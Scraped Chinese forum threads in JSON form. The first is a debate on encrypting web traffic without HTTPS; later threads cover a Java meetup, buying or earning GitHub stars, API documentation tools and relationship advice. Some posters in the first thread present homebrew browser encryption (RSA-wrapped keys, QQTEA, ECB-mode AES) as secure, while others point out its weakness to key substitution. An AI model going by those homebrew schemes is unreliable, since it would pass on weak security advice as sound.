"直接用带 tls 的 tcp 就好了，和 http 没有啥必然关系的，", "vpn 拨上，链路不就加密了？", "没有", "其实楼主的问题, 要解决很简单嘛, 约定一个算法.\r", "比如 QQTEA ", "\r", "\r", "浏览器随机生成加密 KEY, 然后用 RSA 加密, 发给服务器,\r", "服务器 用同样的算法 (PHP 版的 QQTEA  ", "), 使用相同的 KEY 来进行加密,\r", "加密后的内容返回给浏览器, 这样 key 在传输的过程中是加密的, 且 服务器回来内容的时候只有加密后的内容.\r", "这个 key 只有 浏览器和服务器 俩人知道.\r", "\r", "所以就达到了保密的目的.", "把序列化的后的数据（比如 protocol ）的二进制数据，加自己的头，做下偏移。或者伪装成 zip 的文件等等。 说白了就是他自己拿到包也用不了。", " 读题 纯 web", "个人认为无法做到\r", "因为在没有预先建立信任体系的前提下无法对抗中间人攻击\r", "\r", "预先建立的信任体系 是指:\r", "对于 SSL/TLS 则是 PKI(公钥基础设施)\r", "对于 GPG 则是通信双方都信任的、能与通信双方建立可靠连接的 Key Server\r", "\r", "如果你有极可靠的方法(如嵌入软件中或\"面对面交换\")来完成 SSL/TLS 中密钥交换机制所完成的 那另当别论", " 这个可以有。直接告诉使用者一个 key ，让使用者使用前手输。", " 看清楼主的假设好吗? 只考虑监听, 不考虑篡改内容.\r", "\r", "基于这个假设的条件下, 服务器先下发 RSA 公钥, JS 生成一个用于加密的 KEY,\r", "然后对要进行提交的数据使用生成的 KEY 加密,\r", "使用 RSA 算法对 KEY 进行加密, 将 RSA 的结果和要传递的数据的加密结果一起传给服务器,服务器自己解 RSA 之后,用 KEY 解加密数据, 即可.", "端到端加密", " 我并不认为我没有看清楚楼主的假设\r", "\r", "中间人攻击并不<b>仅仅</b>用于篡改传输内容\r", "你要是用匿名(不签名)的 DH/ECDH 抑或是为签名过的 RSA 公钥进行密钥交换，窃听者完全有可能用中间人攻击的手段获取加密通讯的内容.", "gpg 签名且加密，不走 http ，直接走 smtp ＋ tls 互传，即 gpg 加密和签名后的消息报文。\r", "\r", "公私钥安全传递，自己派人用加密 U 盘人肉信使传递吧。（重要的外交文件，依然人肉信使传递)\r", "\r", "想想当前航空用的空地文本通讯，还是用加密的电报传输呢。", " 允许 窃听到内容呀, 但只要能保证不被解密得到原文就可以了.", "先搞清楚什么样的中间人，如果客户端拥有者同时想扮演中间人，他有很多方法截获通信内容；\r", "\r", "如果只是防止真正的第三人， https+浏览器+HPKP 、 HSTS ，或 https+客户端+built-in certificate pinning 就可以。\r", "\r", "如果还不放心，直接双向证书认证的 ipsec 够了吧。", " 我不明白你说的\"内容\"是指的密文还是明文\r", "\r", "我表达的意思是『窃听者可以用中间人攻击的手段获取明文 明文 明文』\r", "明文都叫窃听者获取了还叫\"防止监听\"吗？", " 我上面说的传输的内容用算法进行加密, 你完全忽略了?", "大概三年前我做过一个简单的实验。大致的介绍在这里： ", " 。现在回过头来看，感觉实现的方法还是有点不太成熟的。\r", "\r", "简单的流程大概是这样的：\r", "1.服务器和用户共享一对相同的密码。\r", "2. 用户在浏览器输入密码后，浏览器的 JavaScript 对密码进行 hash 获得对称密钥。\r", "3. JavaScript 用对称密钥对 http 请求的数据进行加密，将加密的数据使用 base64 编码发送至服务器。\r", "4. 服务器解密请求，生成响应的消息体，使用密钥加密消息体并传回客户端。\r", "\r", "以上流程我能想到的一些缺点：\r", "1. 一个是不能保证数据的完整性==》密钥生成的方式容易收到重放攻击。\r", "2. 再一个是使用了 ECB 模式加密数据==>这个倒是可以使用类似的 DH 算法协商一个 IV 。\r", "3. 前向安全性貌似不能保证。", "  还是用代码来说话吧.\r", "演示地址:  ", "\r", "源代码:  ", "\r", "\r", "查看演示的时候, 可以打开控制台, 看 Network 中的请求及响应,\r", "请以窃听者的身份, 根据请求和响应的内容, 得到服务器返回的原始数据.\r", ">  PS: 客户端收到的原始数据会在页面中输出, 以便你检测你自己还原出来的和服务器返回的是一样的.\r", ">> 再再 PS: 如果觉得演示是放在 HTTPS 的站点上有问题的话, 可以自己 clone 一下源码,然后在你本地部署一份,\r", ">>> 然后用 Fiddler 做为 HTTP 代理(窃听者), 根本 Fiddler 里捕获到的数据, 还原输出服务器返回的原始数据.", "我倒是好奇坚持不让用 https 的原因", " \r", "\r", "能篡改的话，想要监听也是轻而易举的把？\r", "\r", "TLS 之所以安全是因为通讯双方的身份都是得到过认证的。服务器向客户端发出一把锁，客户端用自己本地的 CA 记录验证服务器发来的锁是否合法，然后将数据用锁锁好发送给服务器。\r", "\r", "如果没有服务器和客户端验证的过程，数据加密就跟没有一样。\r", "\r", "就楼主需求来说，如果 Web 应用上不了 TLS ，就不要考虑加任何“加密通讯”手段了。因为都是徒劳的，只是给自己的安慰剂而已。别人真想监听，它可以注入一个 JavaScript 绑定所有 Input 的 onChange 事件发出来，这样你拦都拦不住。", " \r", "\r", "\r", "\r", "学习一个\r", "你这个实现无论如何也要进行密钥协商吧？似乎没有使用 DH/ECDH\r", "服务器---RSA 公钥--->客户端\r", "那么有上一行这个过程吧？\r", "\r", "如果中间人有能力篡改连接内容，改了你公钥不就做成了中间人攻击？\r", "SSL 中你把 CSR 交给 CA 不就是给公钥签名让中间人改不了，如果改了客户端会发现吗？\r", "照你的神逻辑 自签名证书也有足够的安全性 OpenSSL 随便就能生成一个谁还花钱找 CA 买证书去？\r", "\r", "此外，你所说\"传输的内容用算法进行加密\",如果你用了非对称加密那不用保证『客户端获取的是服务器的公钥而不是中间人的公钥』？\r", "此外此外，我不明白你一直说的原始数据是指什么？我可以理解为密文吗？", " 看清楼主要讨论的内容好吗?\r", "\r", "都说了 只考虑防窃听到原始数据(未加密前的内容, 上面的例子中服务器返回的 Hello Client 的那段), 不考虑篡改.", "楼主在上面 强调了好几次, 只考虑防窃听不考虑篡改, 可还有一堆上人, 在往 篡改数据上面扯.", " #39 其实 PGP 的信任体系是基于指纹的，密钥服务器不可信，正确的做法是通过传统方式（电话等）核对指纹", " 我没有说『篡改具体通信内容』\r", "而是强调攻击者『通过篡改 [公钥] 』来 [获取] 通信内容\r", "\r", "你听得懂话？", " 查证了一下 这点上的确我错了 可能是习惯了 Ubuntu 的 ppa 源添加后要导入 GPG 公钥\r", "\r", "但是 GPG 的安全性也基于『有条件以确保公钥不被篡改』 这个理解应该没有错误吧", "  篡改公钥  不是篡改吗? 麻烦你去前面看清楼主的要求好吗?", " 所以有不同等级啊，像 ppa 这种人工核对指纹肯定不现实，所以算了算了你们自己下载吧，反正也有 https 被篡改了也是证书商背锅\r", "你的理解是对的，这个条件就是指纹，至于公钥服务器则是任何人都可以建立的东西", " 也不知道是谁听不懂话?", " 可笑 都讲明白了『篡改公钥目的是为了获取明文的通信内容』\r", "况且楼主也没提到『中间人只有偷窥(窃听)的能力，不能做到篡改你的公钥』\r", "\r", "死搅蛮缠", " 自己往上看看楼主在  #5 #8 #13 #18 楼回复的内容, 好吗?\r", "\r", "楼主强调了四次 <<暂时不考虑中间人篡改内容， 只防中间人监听，解密出内容。>> 好吗?\r", "\r", "是谁在 \"死搅蛮缠\" ?", "不知 Flash 能否实现这个需求？", " 用户最初在浏览器输入网址 http 的时候会发生什么？一开始就歪了\r", "\r", "其实楼主也意识到了，不事先在客户端放点可靠的东西话，剩下的都是干不成的", "  没有, 楼主的本意应该只是探讨一下, 在非 HTTPS 以及不考虑 内容被篡改的情况下, 有什么好的方法\r", "防止被其他人监听到传输的原始内容.\r", "\r", "<<暂时不考虑中间人篡改内容， 只防中间人监听，解密出内容。>>  这是楼主的原话.", "这个要求很奇葩，难道是为了省个证书的钱？", "浏览器 ----> 服务端 （这个倒好做， RSA 浏览器公钥加密, \r", "这个不是在你加密之前截获数据就行了么？\r", "- -你要是想依靠 js ， flash 完成加解密，很容易被破解，控件的话破解难度会加大，但是用户体验不好", " flash 也可以反编译还原出加解密流程。", "自己实现一遍 https", "提出这要的要求果然很奇葩。不使用浏览器自带的 https ，反而在 JS 上实现一套不可能健全的 https 。\r", "多出来的开发费用可以买多少年证书了啊。", "   昨晚有事， 一早来看回复了这么多，  大家的回复我都看了，  首先这需求的确奇葩，\r", "首先允许中间人窃听（像什么端口镜像之类等等） （小到公司内网出口，大到运营商出口等，都会分析网络流量）\r", "其次是防止通过窃听流量还原出明文（敲黑板。。。。）\r", "（在浏览器本身，比入注入进浏览器内存获取未加密数据不在考虑范围， 通过浏览器本身的一些插件扩散等都不在考虑范围）\r", "（什么中间人公钥私钥替换中转也都不在此考虑范围）   \r", "xqin 应该是明白我的意思，   你的 DEMO 代码我也看了， 我目前大概也是这样做的， 不过没有用 QQTEA 算法， 还是用标准的 AES ，  跟你的方案不同的是我用了 localStorageService 把本地解密的 KEY 缓存在浏览器内存中， 另一直也在准备用 ecdh 方案来实现密钥交换", " 感谢你再次出来证明,我对你的需求理解是正确的.\r", "\r", "你最后说的打算采用 ECDH 的密钥交换, 其实与你用 RSA 加密 加密 key 再将加密结果传递给服务器,服务器从加密结果中还原出来加密 key 是一样的道理.\r", "\r", "ECDH 的前提也是在客户端放 服务器是公钥, 而 RSA 也是 =,=\r", "而且 ECDH 还需要将客户端的公钥告诉服务器类(可以想像成 RSA 加密后的结果),\r", "然后服务器根据客户端的公钥和自己的私钥算出来一个 共享密钥(服务器解 RSA 得到加密 key).\r", "\r", "套路都是一样的, 只是换了一种算法而已.", "   ^_^"]},
{"content": ["<div class=\"topic_content\">主题 : (3.5)java 技术分享沙龙 springboot 分享第二期\r<br>内容 : \r<br>本期为 [开源开发日] 活动第 23 期。“开源开发日”是由技术交流组织 [开源研习社] 和中软国际解放号合办的技术分享和现场编程交流活动， 活动每周举办，目前已经主办 23 期。此前的分享主题包括： TensorFlow 开源深度学习入门、 XgBoost 预测技术分享、 Java 机器人开发等。\r<br>\r<br>本期活动主题：\r<br>本期分享人 Java Web 开发资深工程师，主题为  [ Java Web 敏捷极速开发体系交流：如何让 java 开发速度跟 php 一样快] \r<br>分享内容包括：（ 1 ） Spring Boot 快速上手  （ 2 ）基于 Spring 生态体系的敏捷开发经验分享  （ 3 ） Java 部署体系和微服务部署分享\r<br>\r<br>活动时间：   2017 年 3 月 5 日（周日） 下午 2 点-5 点\r<br>\r<br>活动流程：\r<br>1. 本期分享人分享本期主题和内容 （ 1 个半小时）\r<br>2. 现场交流和现场编程 （ 1 个半小时）\r<br>\r<br>报名参与:http://www.huodongxing.com/event/4376768490900</div>"], "reply": "目前尚无回", "tittle": "(3.5) Java 技术分享沙龙 springboot 分享第二期", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>当然 github Star 数也分一定等级，例如 100+ 200+ 500+ 1000+ 这样的 Star 数在找工作面试，或者简历筛选的时候有多大优势，能够加分多少？</p>\n</div></div>"], "reply": "74", "tittle": "在 github 上有被 Star 项目在面试时有多大优势？", "comment": ["感觉很大，一个能被别人用的项目，一定可以有他可用之处，当然除了书籍啥的一些类似参考文档的东西。", "代码被重用的次数可以证明其价值", "淘宝两毛钱一条 star", " 我擦，这都成产业了。。。", " 😂这个厉害", "面试官如果不懂 github 看你 star 多 这面试稳如狗 ", "   大牛啊 赶紧招进来", " 我给你转两毛啊", "老板，来一百块钱的", "技术面的时候有用的吧，一般公司 hr 不会看，", "国人在很多方面果然很灵活", "当然有帮助。不过也得看是什么项目，某些 markdown 项目就算了。", " 求淘宝链接，我搜到的怎么都是 2 块 1.9 块的", " 求链接🌚", "我有 3600 个 star ，依然找不到工作", " 哈哈哈哈哈哈", " 什么项目？", " 网红怎么可能找不到工作（笑\r", "\r", " 加起来 3k6", " 赞", " 可以试试阿里，说不定不用面试……", " 好厉害~", " 的确不用面试，因为价值观不合格", " 来，贡献出淘宝链接", " 233333 ，不过阿里喜欢网红是真的，说不定不打不相识呢（笑", "可以和面试官聊 star 多的项目", " 你是真皮沙发", "一共现在大概有 22k 左右的 star ，好处是至少能拿到面试资格，不过有时候对面试官也会造成压力，导致气氛有些尴尬…", "好处是可以跟面试官聊 star 多的项目。对自己更有优势", "人家要 repo 的话，都是直接看代码了吧，谁看你 star 啊，光 star 没活跃度更傻", "不看 start ，看是什么 repo ，你觉得我上面那个情人节礼物的有用吗？", "X 宝可以买到大量的 star", "向 markdown 程序员看齐吧！", "\r", "楼上好厉害", " ...这也是业务链了", " 厉害了，喵神，会对面试官造成压力", " 然后下一张截图应该是这样的，由于 ", " 有人截图了我们的商品介绍，所以现在所有商品的介绍都将采用加密的方式，购买服务后即可获得私钥。", "...........我认为简历里面贴 github 地址最大的用处就是面试官可以看到你代码风格。。。。。例如你是 method 型选手还是 ctrl+cv 型选手.......", " 一看就知道，大司马学生，你很皮！", "   “恶意举报帖子”？？？ [黑人问号]    究竟谁恶意···", " 唉，有这能力为什么还捞偏门呀？", "我觉得 这是个生意 有搞头 哈哈", "2 块钱一个。。", " 这技术又不难的，只是点赞的时候耗时间。", "厉害了", " 为啥会对面试官造成压力 难道是怕被替代😂", "* awesome *", " 不在丁香园了吗", " 链接?我没搜到.", " 早晚被玩坏", "也只是能提高被面试的机会。具体的，还要过去谈。", "顺势走一波，我也有好几 K 。有什么用呢，还不是要找工作。\r", "PS 我面试不看 Star ，除非有上 W 的非 MD repo -_-#", " 喵神面试还有人面技术问题？还以为只谈待遇，价值观呢", "没有太多帮助，我不信技术面试的人不看你代码具体写的什么", " 这 32 楼太 tm 厉害了 啥情况", "楼上说得对，好处就是能够轻松的过简历筛选关。", "2 元一个 ， 真无语\r", "\r", "\r", "\r", "那我这个不是值 1600+\r", "\r", "\r", "\r", "这个不是值 3000+？", " 神 TM 恶意举报？到底谁恶意。脸呢？", "曾经面试一个人的时候，翻开他的 Github 看，一看就知道项目 Star 是僵尸号堆起来的，于是一面就把他挂了。", "淘宝上有刷 star 的", "稳", "一个好的项目是要看 contributors 而不是 star 的...\r", "多 star 的能帮助过简历关...", "如果面试官也用 github 话，会有优势。", "我的话会看，除了 star 还会看具体的代码情况。\r", "不过似乎大多面试官在面试前连简历都不怎么看，更别说 Github 了。", "32 楼亮了", "主要看质量吧 ，现在太多 readme 大神了", "现在的开源项目好多没什么价值，纯粹为了开源而开源的项目太多。即使有些项目很多 star ，但是技术上却没什么难度，这个如果技术面基本加不了分吧。。。", "我只看代码 如果代码质量过硬 就算 0star 也 ok", " 诶你这个学生就很有灵性", "刷 star 很容易就看出来。这种极 low 的行为真是被程序员所不齿。", "我一般都不 star 自己的项目的，ᶘ ᵒᴥᵒᶅ，不如来帮我 star 一下吧 github.com/cbangchen", "真 6 有投票的地方 就有刷手", "MD 程序员就直接 PASS 了吧。", "国内面试没几人看这个吧", "难道他们不会 review 你 gayhub 上的代码吗？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>api    文档是用 wiki 还是 doc</p>\n</div></div>", "<div class=\"topic_content\">除了 api 文档，还有需求设计文档。所以我的问题应该是怎么管理文档的，包括需求文档、设计文档、 api 文档等</div>", "<div class=\"topic_content\">总结如下，后面再补充\r<br>Swagger\r<br>Confluence\r<br>showdoc \r<br>口头传述\r<br>gitlab 传 md....\r<br>天啦，还有 API 文档,没听说过\r<br>raml\r<br>wiki\r<br>gogs \r<br>apidoc \r<br>quip\r<br>意念传输\r<br>postman\r<br>RAP</div>"], "reply": "99", "tittle": "你们团队都是怎么管理 API 文档的", "comment": ["Swagger", "用看云 可以支持 api 文档在线调试", "用的 Confluence, 感觉还行吧，同求推荐。", " 同样是 Confluence", "小幺鸡", "写工具反射得出 API 文档", " 我们是先文档，除了 API 文档，还有设计文档等", "参考： ", " 我们用的 API Blueprint 语法，然后起了个 mock server ，", "口头传述", "推荐 showdoc ，这个还不错的", "通过 gitlab 传 md....", "swagger +1", "swagger +2", "没有。", "天啦，还有 API 文档,没听说过", "Confluence +1", "raml", "wiki", "gogs 建个项目 传 .md 上去", "apidoc ", "尝试过很多，不过现在都转入了 doc ，模板建立好之后，还是挺方便的。", "没有 API 文档。。。", "quip", "内嵌在代码中，验证参数和展示文档调用同一个来源", "confluence ，有个问题是，后来新增的很多字段，都会忘记更新上去。。而且支持 MarkDown 还需要安装插件好像。。", "apidoc", "markdown+gitlab", "意念传输", "Swagger +3\r", "代码生成文档，或者文档生成代码，一旦各自独立书写总会产生不一致。", " doc 多人编辑和同步很麻烦。当然谷歌 doc 是可以的", "swagger+1", "我这边是在用 node 的 apidoc 。。。。。", "postman", "Swagger 可以在线调试，根据文档 API 还能反射出静态文档", "swagger+quip", "有道云协作 + markdown", "使用 wiki 配合 jira 挺好用的", " \r", " \r", " \r", " \r", " \r", " \r", "    \r", "请教一下， swagger 有版本间的比较吗？", "Confluence 编辑文档浏览器天天卡死", "swagger+1", " 用 atom 加插件写类似 Markdown 的语法，用 Aglio 渲染成 html 文档, 顺手用 Drakov 生成 mock server 方便前后端分离开发。", "apizza.cc 用的是这个。 postman 后直接文档", "用 swagger 可以保持接口跟文档同时更新，但是如果用接口生成文档的方式，源代码会有很多原来放在文档里的说明信息。\r", "不管哪种方式，写文档的工作是省不掉的😂", "代码里用 Javadoc\r", "API 文档用 Markdown 写用 SVN 管理版本", "OpenAPI / Swagger", "文档的维护太难了。。。放在代码库里？", " 版本间的比较指的是文档更新后的对比吗？", "我们的 API 没有文档。。", "用过 RAP", "目前在用 RAP  虽然不喜欢 java", " 神圣的 F2 连着我们的思想", "用的是 SBDoc ，可以内网测试， mock 数据，自动生成文档，干净无插件 ", "支持下", "postmant", "swagger +1", "swagger  + asciidoc", " \\(≧▽≦)/", "推荐自动生成文档, 比如 PY 的 sphinx ， api 更新方便维护 ，一键生成也方便。", "用 RAP", "Confluence", "API 的话 Swagger 搭一个本地服务器  然后用 yaml 写文档就行了，自动渲染 高亮", " 这个只能是 java 吗", "居然没有 ", " 任何语言   API 是 json 构建的就行    官网:http://swagger.io/swagger-ui/  github:https://github.com/swagger-api/swagger-ui  clone 下来, 随便搞个简单 http 服务器, dist 目录作为作为 root 目录就可以跑起来     也可以后面小修改下加登录才能查看     语法规范在这里 ", " 嗯 是的 可以对比吗？", "Github Private Repo 放 MD...", "无", "我是业务部门的, 对接的 IT 部门每用一次 API 让我们在对接门户导一次 <<<吐槽", "意念传输  2333", "楼主附言的背后应该是一张面无表情的脸", " 我在用看云 Hhhh", "公司用 Atlassian 的产品\r", "所以需求和设计文档一般都是 Confluence 做描述， PSD 类设计文件用 Google Drive 共享。\r", "关于 API 文档，如 PHP 项目：公司要求每个 attribute 和 method 必须写清楚 PHP Doc ，大家都用 PhpStorm ，一个类有什么东西、怎么用一目了然。", "意念传输，这个总结得很好……", "OneNote + Swagger", "通过代码生成 缺点是代码里注释有点多…", "根据代码注释生成文档（ javadoc ）+ 根据 api 接口使用 springfox 的工具生成 adoc\r", "\r", "只要写好代码，文档都是自动生成的", "意念传输——就服这个，能传授吗？", "postman ， swagger", "居然没有 gitbook", "Confluence 。\r", "是我们是一个 1200+人的团队，面临开发，测试，产品经理，项目经理，运营，商务等等各个部门的协作。 Confluence 能跟公司的通信录系统，邮箱系统对接。当关注的文档发生变化时，立即发送邮件给相关同事。同时， Confluence 支持各种插件，富文本编辑，代码高亮，评论，备注等等功能一应俱全。", "我司使用意念传输。精神授权。", " 默认不支持，可以反射 markdown ，我们是用 swagger api 反射 markdown ，再把 markdown 提交 git ，通过 gollum 展示 wiki 。\r", "\r", "生成 markdown 的脚本： ", "slate + git", "文档？看代码 [冷漠脸] ", "Swagger + Google Drive", "  呃~   \r", "要这么麻烦哦", "我用的 EasyAPI", "用的 ", " 恩，是的 :D", "Confluence+1", "口口想传", "api 是什么东西？可以吃吗？", "rap", "SBDoc 不错啊，楼主可以去了解下，操作很简洁，效果很好，链接： ", "想不收费自己搭建的话，可以使用 ", "\r", "它本身提供云服务，但也可以自己搭建。写文档就是写 markdown ， github 也认这种格式。\r", "\r", " \r", "\r", " \r", "\r", "然后开源社区已经做好了各种工具，包括把 apiblueprint 格式生成 html ， apiblueprint 生成 mock server 等等，非常方便。\r", "我做了个 docker 镜像，只要提供你们写文档的 git 仓库，就可以一键搭建。包含文档服务器， mock server 和 hook api （文档更新的时候自动更新相关内容）\r", "\r", "\r", "另外，你可能会需要对静态网站做 oauth2 认证功能，可以利用这个东西： ", "\r", "\r", "可以配置邮箱白名单，这样只有你们公司的人能访问了。", "apidoc", "个人觉得从测试用例生成文档是体验最棒的文档开发方式。\r", "\r", "最近给 node.js 做的轮子，强力推荐一下\r", "先开大会，再开小会，最后一对一，手把手同步需求"]},
{"content": ["<div class=\"topic_content\">背景：\r<br>我和女朋友在同一家公司，不同部门；\r<br>\r<br>事件：\r<br>好几次女朋友向我吐槽工作中的事，而我总是站在被吐槽的那边(我部门里另一个小组，不同小组做的事差很多)，但我并不是指责女朋友有错，只是想解释对方为什么会这么回答、这么做，我的出发点是：我希望换位思考，让女朋友明白对方为什么会这么回答或这么做；\r<br>\r<br>但每次类似的情况聊到后面，女朋友都会很生气，怀疑我是不是不爱她，为何总帮别人说话，但我并没有任何指责女朋友的意思啊，最后我总是哑巴吃黄连有苦说不出。\r<br>\r<br>你们说我是不是有毛病，还是情商欠费太多得充值…</div>"], "reply": "92", "tittle": "别人向我抱怨/吐槽某人某事时，我好像总是站在被吐槽人那边，我是不是有毛病", "comment": ["你是不是傻……", "既是有毛病 又是情商欠费太多得充值", "😂我也会这么想，不过不会说出来啊，不然不是找死", "如果三观不何，迟早分手。我以前女友也是这样，楼主还是得保持自我，客观，公正。当然，话可以委婉点。", "你女朋友只是想让你陪着吐槽而已，你陪着吐槽下就好了，你又不会少块肉，女友还高兴，何乐而不为？", "基本归因谬论", "这事儿和谁对谁错无关，和道理无关，楼主居然不明白", "人在吐槽时最需要的是在同一战壕的认同感，而绝对不是什么安慰、劝解。（我老婆跟你患了同一种病，跟她说过之后，现在已经好多了..）", "都是成年人了，怎么想是一回事，怎么做又是另外一回事，心直口快不是优点，既然她是你女朋友，你和她就是一伙的，要么分手，不然你肯定得站在她那一边，对错无论，重要的是站队，就算你知道是她的过错，也不能当面指出来，人家一在气头上，二是找你求安慰，想让你和她一起怼别人，你却上去和她讲事实摆道理，她那种状态下，不希望听你的王八念经，同仇敌忾就好了，等她什么时候问你对错的时候，你再这么和她说，理智客观的高大上形象立马起来了，回答是要分场合和氛围的\r", "\r", "她的行为和思考方式应该是你们在一起之前你就应该考虑的，你们在这点上有矛盾，你们有考虑过如何解决吗，这不是个例，长此以往会遇到各种问题，既然不分手，就应该好好考虑下", "你标题還是不太醒目\r", "\r", "别人＝女朋友 ！\r", "\r", "你居然把女友降級为别人...", "你俩迟要完， 女人大部分跟你抱怨的时候，是来找你安慰的，并不是听你 BB ，难倒她不懂这些道理，还要你在 BB 一边？ 她就是不爽， 要找你宣泄的；", "并不需要你发言，你听着就好了啊", "你希望女友能换位思考，却在跟她交流的时候不跟她不换位思考，你只是学艺不精而已。", "赞成 4 楼，三观不同的话不要勉强。谈恋爱就是相互磨合，要是现在委屈求全，结了婚以后能委屈一辈子吗？\r", "当然说话可能重了点，但是我觉得大的道理是这样的，中间的度自己掌握。", "确实情商问题，这时候你安慰安慰或者静静听着就好了啊", "你解释了也没解决任何问题啊…… 你怎么不想点主意能让那人以后不这样干了呢", "楼上一堆人不懂什么是情商     会哄人!=情商", "所以说单身狗找女朋友都是闲的\r", "\r", "一个人不好吗， 手动斜眼:）", "你怎么找到女朋友的。。", " \r", "我觉得你这么批判人家，情商就不算高。。\r", "而且，即使会哄人！=情商，但是不会哄人，甚至还站错队，就真的木有情商～", "要不，你试试看跳槽到我司？哈哈哈哈哈", "兄弟 我曾经也这样， 觉得帮理不帮亲嘛。 然后会站在自诩公允的角度去说这些问题怎么样怎么样，然后每次都换来女友生气，然后两个人都不爽。\r", "多次斗争以后，我就学会了忽悠，没让你发表多正式的意见，听着就好，然后随着她的意见复合几句，要坚定的认为她没错，对方是 SB ，然后日子好过太多了，她要的发泄跟支持，给她!!", "思考问题客观很正常！", "你不是一个人...", "记得 以前有个人说过   长头发要顺着才能理清   要因势利导 \r", "别人是在找发泄的地方  你现在给人添堵   当然如果这种事对方还能跟你过 那真是一个宝 好好珍惜吧\r", "可惜啊 当年的确是把这句话给记下来了 可实践的时候 压根不考虑 \r", "也是人都喜欢听奉承话", "你是不是傻...", "#为什么这样的都有女朋友#", "果然情商堪忧.. 不过卤煮能注意到这点是好事..", "其实不一定是这些事，任何事情上，有些人总会有目的（心机 X ）或者不自觉（可能缺乏安全）地不断要求对方妥协，以此提高相互关系中的优势地位。\r", "就看题主不能接受这样水平的女人，要么忍着，要么换一个。\r", "有自信和理性的女人很难找啊。", "不要和她讲道理，无脑站边她没问题的。。。。。", "把你女朋友换成你亲爸妈试试", "这个道理我很多年前就自己摸索通了，人家当下要的哪是你的大道理啊？？", "要的是支持\r", "而不是对错 \r", "下一题", " 😂", " 主要是担心标题太突出太“异类” 然后没人进来回复 现在想想是我错了 回复的应该都是有女朋友的 都是经验之谈😁", " 我以为只有我们沉闷的程序员才会这样 (没有冒犯的意思哈", "我好像知道我没有女朋友的原因了 ", "  \r", "然而我觉得我的选择没错", " 她也是程序员...", "“当我问他，我和我同事谁错了？的时候，我不是让他来给我做分析的”——来自 papi 酱", "这个东西还是算了，太累了，我觉得应该少聊一些工作的事情，除了工作还有很多事情可以弄的", "你总是为别人着想，但是就是不为女朋友想", "楼主这样的人倒是很可爱的。对你女朋友可以表现出理解的态度，不过你该分析的还是要分析的，这样你的女朋友才能提高。不过分析阶段可以放到后面进行，先安抚一下女友的情绪。\r", "\r", "楼上那些女友抱怨就一味附和的，只体现出息事宁人的态度，起不到沟通的效果，也没有从根本上解决问题。\r", "\r", "两个人在一起根本上还是要共同进步才能长久。", "这个标题不要让你女朋友看到", "我就想问下题主,你们在公司公开你们的关系了吗", "你就静静的听着,然后表示赞同她的一切观点就行了", "我看药丸", "撸主买一箱六个核桃吧 补补..要不然药丸", "确实有毛病，情商太低。女人心眼小，你要小心了。", "总结说就是不会做人。不知道楼主对外人怎么样，有时很奇怪的对越亲的人说话越不好听。", "事实上，楼下有许多人的做法，和楼主帖子中描述的情况，是一样的。\r", "\r", "把这个情感问题转变成一个或者多个逻辑问题告诉楼主，并给分析过程的，真的要给个赞。", " 是的。。有时候在外怂成狗，回家欺负家人的 很多。。", "这个问题···小伙子 经历过几次，你就知道该怎么跟女朋友说话了", "是，下一题。", "充值去吧，要不吃早被踢。", "虽然首长说过要实事求是发展，但那是国家大事，你这种儿女情长还是坚持“帮亲不帮理”这一基本原则吧", "我总是感觉自己太帅了，楼主怎么看？", "Critical thinking 技能点的太高了。你下回记得你朋友跟你吐槽的初衷不是让你帮她分析，只是说给你听派遣一下而已。", "男人和女人都这样\r", "你又不是她的基佬闺蜜", "再过两年回来看这个帖子，你就觉得自己当时多么傻了。\r", "\r", "回归正题，楼主既然能换位思考别人，那你可以换位思考你女朋友啊，你想想她为什么要跟你抱怨 /吐槽。你先听完讲完，顺着她说，等过几天你再提起这事儿，说你的想法。简单说，你不应该直接给她你换位思考的结果。", "这种问题，跟情商完全无关啊，还有楼上那些说三观不同早晚分手的，拜托回去补充一下两性知识再来发言，别耽误了别人……\r", "\r", "女性和男性的思维模式是不同的，源于几千年来的性别差异和社会分工。简单来说就是：女性喜欢宣泄情绪，男性喜欢解决问题。具体到这个帖子再简单不过，楼主女朋友觉得受了气，心里不爽，要吐槽发泄一下。楼主觉得发泄不解决问题，得治病治本，釜底抽薪，所以老是去分析事情的前因后果，反倒又惹女朋友生气。\r", "\r", "明白这一点后再怎么做就很简单了：女朋友吐槽谁，你就骂谁。", "和女人谈道理，你就是有毛病。", " 不能再同意了，如果大家不是一个世界的人，三观也不合的话，长久下去，无论大小事都要免不了不断碰撞。", "搜嘎，看了这贴，恍然大悟。。。", "分手，下一题", "我支持楼主，现在被吐槽人那边可能真的是那边是对的，希望女友看清做正确做好。不一定就因为是女友就一边倒。我就是这样的。  当然了，这个问题不会导致分手，这个我有把握", "女人吐槽 不是想让你说事情  只是想让你 说 恩  恩是的 那个小婊砸就是可恶", "别说女朋友了 我妈吐槽别人 我现在对方角度给她思考也被说白眼狼。\r", " 女性普遍是要比男性感性 很多", "wc,,完全一样的剧情", "是的。", "你不是一个人", "其实不光女友，一般人也一样，说话要分对象和场合，明知道他不会听，听不进的，意见放在心里保留就好了，找合适的机会能谈再谈不迟的，讲道理是和听得进去的人讲，对谁都一样，否则只能是无谓争吵。", "分手，下一题", "跟我一毛一样！哈哈", "仅仅是女友的吐槽的话，确实可能是女友的问题\r", "\r", "如果所有人对你吐槽，你都会站在对立方去思考问题，我觉得是病，得电\r", "\r", "当然自己女友吐槽时不无脑支持，这个病也不轻，电一下可能也有帮助", "领导都是对的", "我想问问你女朋友上 V 站吗...", "确实有毛病 Orz\r", "撇开女盆友不说\r", "即便是一般朋友同事\r", "你这个做法也是交往大忌", "另外，这个帖子的标题请不要让你女朋友看到\r", "简直捉急。\r", "万一真让你变成别人你上哪儿去吐槽", " 赞同", "我也这样，因为我老婆老无理取闹，所以她说的东西我都要先打个问号", "当一个女生找你抱怨某事，请不要讲道理，她只是想你安慰她跟她站一边  \r", "当一个女生找你抱怨某事，请不要讲道理，她只是想你安慰她跟她站一边  \r", "当一个女生找你抱怨某事，请不要讲道理，她只是想你安慰她跟她站一边  \r", "重要的事情说三遍！！！", "原来别人指的不是别人，而是女票。。。", "静静的听，什么都不要说。\r", "要不你俩要吵起来。为了别人吵架干嘛跟自己过不去。", "#炫耀有女朋友系列# 鉴定完毕", "男女思考方式 不同。。。", "其实楼主是想女朋友换位思考，出发点对，注意语气就好了，不管说什么，一定要表现出是和女朋友站一边的，否则迟早分", "明显她们很多人更容易从“你说的对，我站在你这边”，“真漂亮”，“一点也不胖”这类简单语言中获得更多的快乐更多的满足。理性相关的指数略低，不足以讨论实质性问题", 